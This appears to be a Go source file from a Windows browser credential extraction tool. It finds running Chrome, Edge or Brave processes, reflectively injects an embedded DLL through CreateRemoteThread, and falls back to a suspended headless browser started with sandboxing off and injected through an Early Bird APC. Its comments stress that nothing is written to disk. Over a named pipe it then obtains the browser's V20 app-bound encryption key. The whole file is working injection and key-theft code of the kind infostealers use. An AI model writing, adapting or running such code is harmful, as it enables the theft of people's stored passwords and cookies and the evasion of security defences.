//go:build windows

package platform

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modKernel32Inj         = windows.NewLazySystemDLL("kernel32.dll")
	procVirtualAllocEx     = modKernel32Inj.NewProc("VirtualAllocEx")
	procVirtualFreeEx      = modKernel32Inj.NewProc("VirtualFreeEx")
	procCreateRemoteThread = modKernel32Inj.NewProc("CreateRemoteThread")
	procQueueUserAPC       = modKernel32Inj.NewProc("QueueUserAPC")
)

// findReflectiveLoaderOffset parses the PE export table in file layout and
// returns the file offset of the ReflectiveLoader export function.
func findReflectiveLoaderOffset(pe []byte) (uint32, error) {
	if len(pe) < 64 || pe[0] != 'M' || pe[1] != 'Z' {
		return 0, fmt.Errorf("not a valid PE")
	}
	lfanew := binary.LittleEndian.Uint32(pe[60:])
	if int(lfanew)+24 > len(pe) {
		return 0, fmt.Errorf("truncated PE header")
	}
	if binary.LittleEndian.Uint32(pe[lfanew:]) != 0x00004550 {
		return 0, fmt.Errorf("bad PE signature")
	}

	coffOff := lfanew + 4
	numSections := binary.LittleEndian.Uint16(pe[coffOff+2:])
	optHeaderSize := binary.LittleEndian.Uint16(pe[coffOff+16:])
	optHeaderOff := coffOff + 20

	if int(optHeaderOff)+4 > len(pe) {
		return 0, fmt.Errorf("truncated optional header")
	}
	magic := binary.LittleEndian.Uint16(pe[optHeaderOff:])

	var exportRVA uint32
	switch magic {
	case 0x10b: // PE32
		if int(optHeaderOff)+100 > len(pe) {
			return 0, fmt.Errorf("PE32 optional header too short")
		}
		exportRVA = binary.LittleEndian.Uint32(pe[optHeaderOff+96:])
	case 0x20b: // PE32+
		if int(optHeaderOff)+116 > len(pe) {
			return 0, fmt.Errorf("PE32+ optional header too short")
		}
		exportRVA = binary.LittleEndian.Uint32(pe[optHeaderOff+112:])
	default:
		return 0, fmt.Errorf("unknown PE magic 0x%x", magic)
	}

	sectionOff := optHeaderOff + uint32(optHeaderSize)

	// rva2fo converts a virtual RVA to a file offset via the section table.
	rva2fo := func(rva uint32) uint32 {
		for i := uint16(0); i < numSections; i++ {
			off := sectionOff + uint32(i)*40
			if int(off)+40 > len(pe) {
				break
			}
			// IMAGE_SECTION_HEADER layout:
			//   +0  Name[8]
			//   +8  VirtualSize
			//   +12 VirtualAddress
			//   +16 SizeOfRawData
			//   +20 PointerToRawData
			vAddr := binary.LittleEndian.Uint32(pe[off+12:])
			vSize := binary.LittleEndian.Uint32(pe[off+8:])
			rawPtr := binary.LittleEndian.Uint32(pe[off+20:])
			rawSize := binary.LittleEndian.Uint32(pe[off+16:])
			span := vSize
			if rawSize > span {
				span = rawSize
			}
			if rva >= vAddr && rva < vAddr+span {
				delta := rva - vAddr
				if delta < rawSize {
					return rawPtr + delta
				}
			}
		}
		// RVA might be in the PE headers (before the first section).
		if numSections > 0 {
			firstRaw := binary.LittleEndian.Uint32(pe[sectionOff+20:])
			if rva < firstRaw {
				return rva
			}
		}
		return 0
	}

	exportFO := rva2fo(exportRVA)
	if exportFO == 0 || int(exportFO)+40 > len(pe) {
		return 0, fmt.Errorf("invalid export directory")
	}

	// IMAGE_EXPORT_DIRECTORY offsets:
	//   +20 NumberOfFunctions
	//   +24 NumberOfNames
	//   +28 AddressOfFunctions
	//   +32 AddressOfNames
	//   +36 AddressOfNameOrdinals
	numNames := binary.LittleEndian.Uint32(pe[exportFO+24:])
	functionsFO := rva2fo(binary.LittleEndian.Uint32(pe[exportFO+28:]))
	namesFO := rva2fo(binary.LittleEndian.Uint32(pe[exportFO+32:]))
	ordinalsFO := rva2fo(binary.LittleEndian.Uint32(pe[exportFO+36:]))

	for i := uint32(0); i < numNames; i++ {
		if int(namesFO+i*4+4) > len(pe) {
			break
		}
		nameFO := rva2fo(binary.LittleEndian.Uint32(pe[namesFO+i*4:]))
		if nameFO == 0 || int(nameFO) >= len(pe) {
			continue
		}
		name := pe[nameFO:]
		found := false
		for k := 0; k < 64 && int(nameFO)+k+16 <= len(pe); k++ {
			if name[k] == 0 {
				break
			}
			if name[k] == 'R' && string(name[k:k+16]) == "ReflectiveLoader" {
				found = true
				break
			}
		}
		if !found {
			continue
		}
		if int(ordinalsFO+i*2+2) > len(pe) {
			break
		}
		ordinal := uint32(binary.LittleEndian.Uint16(pe[ordinalsFO+i*2:]))
		if int(functionsFO+ordinal*4+4) > len(pe) {
			break
		}
		funcFO := rva2fo(binary.LittleEndian.Uint32(pe[functionsFO+ordinal*4:]))
		if funcFO != 0 {
			return funcFO, nil
		}
	}
	return 0, fmt.Errorf("ReflectiveLoader export not found")
}

// writeReflectiveDLL allocates RWX memory in hProcess, writes the full DLL image,
// and returns the remote address of the ReflectiveLoader entry point.
func writeReflectiveDLL(hProcess windows.Handle, dllBytes []byte) (loaderAddr uintptr, remoteMem uintptr, err error) {
	loaderOff, err := findReflectiveLoaderOffset(dllBytes)
	if err != nil {
		return 0, 0, fmt.Errorf("find reflective loader: %w", err)
	}

	remoteMem, _, _ = procVirtualAllocEx.Call(
		uintptr(hProcess), 0, uintptr(len(dllBytes)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE,
	)
	if remoteMem == 0 {
		return 0, 0, fmt.Errorf("VirtualAllocEx failed")
	}

	var written uintptr
	if err := windows.WriteProcessMemory(hProcess, remoteMem, &dllBytes[0], uintptr(len(dllBytes)), &written); err != nil {
		procVirtualFreeEx.Call(uintptr(hProcess), remoteMem, 0, windows.MEM_RELEASE)
		return 0, 0, fmt.Errorf("WriteProcessMemory: %w", err)
	}

	return remoteMem + uintptr(loaderOff), remoteMem, nil
}

// InjectDLL reflectively injects the DLL into a running process via CreateRemoteThread.
// The DLL bytes are written directly into the target process — no temp file on disk.
func InjectDLL(dllBytes []byte, pipeName string, targetPID uint32) (*PipeSession, error) {
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION|
			windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ,
		false, targetPID)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", targetPID, err)
	}

	loaderAddr, _, err := writeReflectiveDLL(hProcess, dllBytes)
	if err != nil {
		windows.CloseHandle(hProcess)
		return nil, err
	}

	hThread, _, lerr := procCreateRemoteThread.Call(uintptr(hProcess), 0, 0, loaderAddr, 0, 0, 0)
	if hThread == 0 {
		windows.CloseHandle(hProcess)
		return nil, fmt.Errorf("CreateRemoteThread: %w", lerr)
	}
	windows.CloseHandle(windows.Handle(hThread))

	logf("DLL reflectively injected into PID %d", targetPID)

	return &PipeSession{
		pid:      targetPID,
		hProcess: hProcess,
	}, nil
}

func cleanupInjection(hProcess windows.Handle, addr uintptr) {
	procVirtualFreeEx.Call(uintptr(hProcess), addr, 0, windows.MEM_RELEASE)
	windows.CloseHandle(hProcess)
}

// CreatePipeSession creates a named pipe, sets the env var, reflectively injects
// the DLL into an existing browser process, and waits for connection.
// Falls back to creating a new headless browser process if injection into
// an existing process fails or times out.
func CreatePipeSession(dllBytes []byte, browserName string) (*PipeSession, error) {
	pipeName := createPipeName()
	logf("creating pipe: %s", pipeName)

	windows.SetEnvironmentVariable(syscall.StringToUTF16Ptr("RECOVERY_PIPE"), syscall.StringToUTF16Ptr(pipeName))

	hPipe, err := createPipeServer(pipeName)
	if err != nil {
		return nil, fmt.Errorf("create pipe server: %w", err)
	}

	pids, err := FindProcesses(BrowserExeName(browserName))
	if err != nil {
		windows.CloseHandle(hPipe)
		return nil, err
	}

	const maxExistingTries = 3
	if len(pids) > 0 {
		for i, pid := range pids {
			if i >= maxExistingTries {
				logf("reached max existing process attempts (%d) for %s", maxExistingTries, browserName)
				break
			}
			logf("trying existing %s PID %d", browserName, pid)
			s, err := InjectDLL(dllBytes, pipeName, pid)
			if err != nil {
				logf("inject PID %d failed: %v", pid, err)
				continue
			}
			if err := waitPipeConnect(hPipe, 5000); err != nil {
				logf("pipe connect timeout for PID %d", pid)
				s.Close()
				procDisconnectNamedPipe.Call(uintptr(hPipe))
				windows.CloseHandle(hPipe)
				hPipe, err = createPipeServer(pipeName)
				if err != nil {
					return nil, fmt.Errorf("recreate pipe: %w", err)
				}
				continue
			}
			s.hPipe = hPipe
			ActivePipeSession = s
			logf("pipe session established with existing %s (PID %d)", browserName, pid)
			return s, nil
		}
		logf("failed to inject into existing %s processes, will try creating new process", browserName)
	} else {
		logf("no running %s found, will create new headless process", browserName)
	}

	s, err := CreateAndInjectBrowser(dllBytes, pipeName, browserName)
	if err != nil {
		windows.CloseHandle(hPipe)
		return nil, fmt.Errorf("create and inject browser: %w", err)
	}

	if err := waitPipeConnect(hPipe, 15000); err != nil {
		logf("pipe connect timeout for new process")
		s.Close()
		windows.CloseHandle(hPipe)
		return nil, fmt.Errorf("pipe connect timeout")
	}

	s.hPipe = hPipe
	s.ownsProcess = true
	ActivePipeSession = s
	logf("pipe session established with new %s (PID %d)", browserName, s.pid)
	return s, nil
}

// FindProcesses returns PIDs of running processes matching the given exe name.
func FindProcesses(exeName string) ([]uint32, error) {
	if exeName == "" {
		return nil, nil
	}
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(hSnapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err := windows.Process32First(hSnapshot, &entry); err != nil {
		return nil, err
	}

	var pids []uint32
	for {
		if syscall.UTF16ToString(entry.ExeFile[:]) == exeName {
			pids = append(pids, entry.ProcessID)
		}
		if err := windows.Process32Next(hSnapshot, &entry); err != nil {
			break
		}
	}
	return pids, nil
}

func BrowserExeName(name string) string {
	switch name {
	case "Chrome":
		return "chrome.exe"
	case "Edge":
		return "msedge.exe"
	case "Brave":
		return "brave.exe"
	}
	return ""
}

// CreateAndInjectBrowser creates a new suspended browser process and reflectively
// injects the DLL via Early Bird APC. No temp file is written to disk.
func CreateAndInjectBrowser(dllBytes []byte, pipeName string, browserName string) (*PipeSession, error) {
	browserPath, err := getBrowserPath(browserName)
	if err != nil {
		return nil, fmt.Errorf("get browser path: %w", err)
	}

	browserPathW, err := syscall.UTF16PtrFromString(browserPath)
	if err != nil {
		return nil, err
	}
	cmdLine := fmt.Sprintf(`"%s" --headless --disable-gpu --no-sandbox --disable-dev-shm-usage`, browserPath)
	cmdLineW, err := syscall.UTF16PtrFromString(cmdLine)
	if err != nil {
		return nil, err
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	if err := windows.CreateProcess(browserPathW, cmdLineW, nil, nil, false,
		windows.CREATE_SUSPENDED, nil, nil, &si, &pi); err != nil {
		return nil, fmt.Errorf("CreateProcess: %w", err)
	}
	logf("created suspended %s process (PID: %d)", browserName, pi.ProcessId)

	loaderAddr, _, err := writeReflectiveDLL(pi.Process, dllBytes)
	if err != nil {
		windows.TerminateProcess(pi.Process, 0)
		windows.CloseHandle(pi.Process)
		windows.CloseHandle(pi.Thread)
		return nil, err
	}

	// Queue APC to the main thread — fires on its first alertable wait after resume.
	ret, _, aerr := procQueueUserAPC.Call(loaderAddr, uintptr(pi.Thread), 0)
	if ret == 0 {
		windows.TerminateProcess(pi.Process, 0)
		windows.CloseHandle(pi.Process)
		windows.CloseHandle(pi.Thread)
		return nil, fmt.Errorf("QueueUserAPC: %w", aerr)
	}
	logf("queued APC for reflective loader")

	windows.ResumeThread(pi.Thread)
	logf("resumed process main thread")

	return &PipeSession{
		pid:         pi.ProcessId,
		hProcess:    pi.Process,
		ownsProcess: true,
	}, nil
}

func getBrowserPath(browserName string) (string, error) {
	var paths []string
	switch browserName {
	case "Chrome":
		paths = []string{
			filepath.Join(os.Getenv("ProgramFiles"), "Google", "Chrome", "Application", "chrome.exe"),
			filepath.Join(os.Getenv("ProgramFiles(x86)"), "Google", "Chrome", "Application", "chrome.exe"),
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "Application", "chrome.exe"),
		}
	case "Edge":
		paths = []string{
			filepath.Join(os.Getenv("ProgramFiles"), "Microsoft", "Edge", "Application", "msedge.exe"),
			filepath.Join(os.Getenv("ProgramFiles(x86)"), "Microsoft", "Edge", "Application", "msedge.exe"),
		}
	case "Brave":
		paths = []string{
			filepath.Join(os.Getenv("ProgramFiles"), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
			filepath.Join(os.Getenv("ProgramFiles(x86)"), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
			filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
		}
	default:
		return "", fmt.Errorf("unknown browser: %s", browserName)
	}
	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			return p, nil
		}
	}
	return "", fmt.Errorf("%s not found", browserName)
}

// TryV20KeyViaBrowserSession attempts to decrypt a V20 key by injecting a DLL
// into a browser process and communicating via named pipe.
func TryV20KeyViaBrowserSession(processName, browserName string, encBlob []byte) ([]byte, error) {
	dllBytes := GetEmbeddedDLL()
	if dllBytes == nil {
		return nil, fmt.Errorf("no embedded DLL")
	}

	pids, _ := FindProcesses(processName)
	if len(pids) == 0 && browserName == "Chrome" {
		return nil, fmt.Errorf("no running Chrome processes for V20")
	}

	pipeName := createPipeName()
	hPipe, err := createPipeServer(pipeName)
	if err != nil {
		return nil, fmt.Errorf("create pipe: %w", err)
	}

	const maxTries = 3
	for i, pid := range pids {
		if i >= maxTries {
			break
		}
		_, injErr := InjectDLL(dllBytes, pipeName, pid)
		if injErr != nil {
			logf("V20 inject %s PID %d: %v", browserName, pid, injErr)
			continue
		}
		if connErr := waitPipeConnect(hPipe, 3000); connErr != nil {
			logf("V20 pipe timeout for %s PID %d", browserName, pid)
			procDisconnectNamedPipe.Call(uintptr(hPipe))
			windows.CloseHandle(hPipe)
			hPipe, err = createPipeServer(pipeName)
			if err != nil {
				return nil, fmt.Errorf("recreate pipe: %w", err)
			}
			continue
		}
		s := &PipeSession{hPipe: hPipe}
		encB64 := base64.StdEncoding.EncodeToString(encBlob)
		key, keyErr := s.GetV20Key(browserName, encB64)
		s.Close()
		return key, keyErr
	}

	if browserName == "Chrome" {
		windows.CloseHandle(hPipe)
		tried := len(pids)
		if tried > maxTries {
			tried = maxTries
		}
		return nil, fmt.Errorf("V20 session failed for Chrome (tried %d existing PIDs)", tried)
	}

	logf("existing %s PIDs failed for V20, launching headless process", browserName)
	windows.SetEnvironmentVariable(syscall.StringToUTF16Ptr("RECOVERY_PIPE"), syscall.StringToUTF16Ptr(pipeName))
	s, err := CreateAndInjectBrowser(dllBytes, pipeName, browserName)
	if err != nil {
		windows.CloseHandle(hPipe)
		return nil, fmt.Errorf("create headless %s for V20: %w", browserName, err)
	}
	if connErr := waitPipeConnect(hPipe, 15000); connErr != nil {
		s.Close()
		windows.CloseHandle(hPipe)
		return nil, fmt.Errorf("pipe connect timeout for new headless %s", browserName)
	}
	s.hPipe = hPipe
	encB64 := base64.StdEncoding.EncodeToString(encBlob)
	key, keyErr := s.GetV20Key(browserName, encB64)
	s.Close()
	return key, keyErr
}
